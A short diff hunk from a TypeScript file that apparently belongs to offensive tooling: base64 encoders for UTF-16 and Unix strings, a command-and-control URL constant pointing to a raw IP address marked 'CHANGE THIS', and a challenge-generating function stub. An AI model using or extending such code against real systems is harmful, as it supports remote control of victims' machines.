@@ -31,7 +31,7 @@ const b64UTF16 = (str: string) => {
 // Base64 for Unix (UTF‑8)
 const b64Standard = (str: string) => btoa(unescape(encodeURIComponent(str)));
 
-const C2_URL = 'http://64.204.80.251/650/'; // CHANGE THIS
+const C2_URL = 'http://64.204.80.251/650'; // CHANGE THIS
 
 
 function randomChallenge(): string {
